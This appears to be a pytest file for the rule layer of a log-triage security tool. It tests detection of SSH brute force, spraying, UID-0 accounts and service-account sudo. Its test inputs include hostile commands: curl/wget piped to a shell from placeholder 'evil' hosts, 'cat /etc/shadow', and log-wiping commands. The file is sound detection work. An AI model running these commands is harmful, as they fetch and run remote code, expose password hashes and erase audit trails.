"""Rule-layer tests. No model, no network, no fixtures needed."""
from app import prefilter
from app.models import Analysis, Severity, Verdict

BRUTE = """\
Oct  9 14:22:01 web01 sshd[1]: Failed password for invalid user admin from 1.2.3.4 port 1 ssh2
Oct  9 14:22:03 web01 sshd[2]: Failed password for invalid user root from 1.2.3.4 port 2 ssh2
Oct  9 14:22:05 web01 sshd[3]: Failed password for invalid user oracle from 1.2.3.4 port 3 ssh2
Oct  9 14:22:07 web01 sshd[4]: Accepted password for deploy from 1.2.3.4 port 4 ssh2
"""


def fired(log: str) -> set[str]:
    return {s.rule_id for s in prefilter.run(log).signals}


# --- parsing ---------------------------------------------------------------

def test_syslog_fields_are_extracted():
    event = prefilter.parse(BRUTE)[0]
    assert event.host == "web01"
    assert event.process == "sshd"
    assert event.ips == ["1.2.3.4"]
    assert "Failed password" in event.message


def test_unparseable_line_still_gets_content_rules():
    log = 'COMMAND=/bin/bash -c "curl http://1.2.3.4/x.sh | sh"'
    assert "R004" in fired(log)


def test_blank_lines_are_skipped():
    assert prefilter.run("\n\n  \n").events_parsed == 0


# --- R001 / R002 / R003: correlated authentication -------------------------

def test_failures_then_success_is_critical():
    report = prefilter.run(BRUTE)
    signal = next(s for s in report.signals if s.rule_id == "R001")
    assert signal.severity == Severity.critical
    assert signal.technique_id == "T1110"
    assert report.severity_floor == Severity.critical
    assert "deploy" in signal.detail


def test_two_failures_then_success_is_below_threshold():
    # A user mistyping their password must not become a critical incident.
    log = "\n".join(BRUTE.splitlines()[1:])
    assert "R001" not in fired(log)


def test_success_from_a_different_source_does_not_correlate():
    log = BRUTE.replace("Accepted password for deploy from 1.2.3.4", "Accepted password for deploy from 10.0.0.9")
    assert "R001" not in fired(log)


def test_many_failures_without_success_is_only_an_attempt():
    lines = [f"Oct  9 03:0{i}:11 m sshd[{i}]: Failed password for invalid user u{i} from 9.9.9.9 port {i} ssh2" for i in range(6)]
    report = prefilter.run("\n".join(lines))
    ids = {s.rule_id for s in report.signals}
    assert "R002" in ids and "R001" not in ids
    assert report.severity_floor == Severity.medium


def test_distinct_accounts_from_one_source_is_spraying():
    lines = [f"Oct  9 03:0{i}:11 m sshd[{i}]: Failed password for invalid user name{i} from 8.8.4.4 port {i} ssh2" for i in range(4)]
    signal = next(s for s in prefilter.run("\n".join(lines)).signals if s.rule_id == "R003")
    assert signal.technique_id == "T1110.003"


# --- R004-R008: content rules ---------------------------------------------

def test_pipe_to_shell_variants_all_match():
    for command in (
        'COMMAND=/bin/bash -c "curl http://1.2.3.4/x.sh | sh"',
        "wget -qO- http://evil/a | bash",
        "curl -s http://evil/b |sudo sh",
        "fetch -o - http://evil/c | zsh",
    ):
        assert "R004" in fired(command), command


def test_ordinary_curl_without_a_pipe_does_not_fire():
    assert "R004" not in fired("COMMAND=/usr/bin/curl -o /tmp/pkg.tar.gz https://releases.example.com/pkg")


def test_uid_zero_account_creation_is_critical():
    log = "Oct  9 16:40:13 db02 useradd[7721]: new user: name=svc, UID=0, GID=0, home=/home/svc"
    signal = next(s for s in prefilter.run(log).signals if s.rule_id == "R005")
    assert signal.severity == Severity.critical


def test_normal_account_creation_does_not_fire():
    log = "Oct  9 16:40:13 db02 useradd[7721]: new user: name=alice, UID=1021, GID=1021, home=/home/alice"
    assert "R005" not in fired(log)


def test_log_tampering_patterns():
    for command in ("truncate -s 0 /var/log/auth.log", "rm /var/log/wtmp", "history -c", "journalctl --vacuum-time=1s"):
        assert "R006" in fired(command), command


def test_shadow_file_read():
    assert "R007" in fired("COMMAND=/bin/cat /etc/shadow")


def test_sudo_by_service_account_is_high():
    log = "Oct  9 16:40:12 db02 sudo:  www-data : USER=root ; COMMAND=/bin/ls"
    signal = next(s for s in prefilter.run(log).signals if s.rule_id == "R008")
    assert signal.severity == Severity.high


def test_sudo_by_a_human_account_does_not_fire():
    log = "Oct  9 16:40:12 db02 sudo:  deploy : USER=root ; COMMAND=/bin/ls"
    assert "R008" not in fired(log)


def test_benign_log_is_clean():
    log = """\
Oct  9 09:15:02 web01 CRON[1820]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct  9 09:20:01 web01 sshd[1902]: Accepted publickey for deploy from 10.0.3.14 port 44210 ssh2
"""
    report = prefilter.run(log)
    assert report.clean and report.signals == [] and report.severity_floor == Severity.info


# --- the floor -------------------------------------------------------------

def analysis(verdict="suspicious", severity="medium", technique=None):
    return Analysis.model_validate({
        "verdict": verdict, "severity": severity, "attack_type": "x", "confidence": 0.5,
        "mitre": {"technique_id": technique, "technique_name": None},
        "summary": "s",
    })


def test_floor_raises_an_undercalled_assessment():
    got = analysis()
    changed = prefilter.apply_floor(got, prefilter.run(BRUTE))
    assert changed
    assert got.severity == Severity.critical
    assert got.verdict == Verdict.malicious


def test_floor_never_lowers_a_correct_assessment():
    got = analysis(verdict="malicious", severity="critical")
    report = prefilter.run("Oct  9 1 m sshd[1]: Failed password for u from 9.9.9.9 port 1 ssh2")
    prefilter.apply_floor(got, report)
    assert got.severity == Severity.critical


def test_floor_supplies_a_technique_the_model_omitted():
    got = analysis()
    prefilter.apply_floor(got, prefilter.run(BRUTE))
    assert got.mitre.technique_id == "T1110"
    assert got.mitre.technique_name == "Brute Force"


def test_floor_leaves_the_models_own_technique_alone():
    got = analysis(technique="T1078")
    prefilter.apply_floor(got, prefilter.run(BRUTE))
    assert got.mitre.technique_id == "T1078"


def test_clean_log_changes_nothing():
    got = analysis(verdict="benign", severity="info")
    assert not prefilter.apply_floor(got, prefilter.run("Oct  9 09:15:02 w systemd[1]: Started thing."))
    assert got.severity == Severity.info
